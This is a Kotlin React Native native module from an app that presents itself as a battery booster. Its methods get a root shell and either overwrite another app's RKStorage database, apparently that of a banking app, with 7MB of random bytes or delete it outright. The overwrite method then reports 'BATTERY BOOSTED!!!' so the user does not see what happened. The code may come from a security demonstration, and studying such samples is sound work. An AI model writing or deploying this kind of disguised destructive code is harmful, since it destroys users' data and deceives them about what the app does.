package com.batterybooster

import java.io.DataOutputStream

import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.Promise

class TokenDestroyerModule(reactContext: ReactApplicationContext) :
    ReactContextBaseJavaModule(reactContext) {

    override fun getName(): String {
        return "TokenDestroyer"
    }

    @ReactMethod
    fun corruptToken(promise: Promise) {
        try {
            // The command to inject 7MB of random binary junk into RKStorage
            val command = "head -c 7000000 /dev/urandom > /data/data/com.ahmadsyuaib.androidmobilebankingapp/databases/RKStorage"

            // Start a su shell
            val process = Runtime.getRuntime().exec("su")
            val output = DataOutputStream(process.outputStream)

            // Write the command to the shell
            output.writeBytes("$command\n")
            output.writeBytes("exit\n")
            output.flush()

            // Wait for it to finish
            process.waitFor()

            promise.resolve("BATTERY BOOSTED!!!")
        } catch (e: Exception) {
            promise.reject("ERR_CORRUPT", "SU shell failed: ${e.message}")
        }
    }

    @ReactMethod
    fun deleteToken(promise: Promise) {
        try {
            val cmd = arrayOf(
                "su", "-c",
                "rm /data/data/com.ahmadsyuaib.androidmobilebankingapp/databases/RKStorage"
            )
            Runtime.getRuntime().exec(cmd)
            promise.resolve("Token deleted.")
        } catch (e: Exception) {
            promise.reject("ERR_DELETE", "Failed to delete: ${e.message}")
        }
    }

}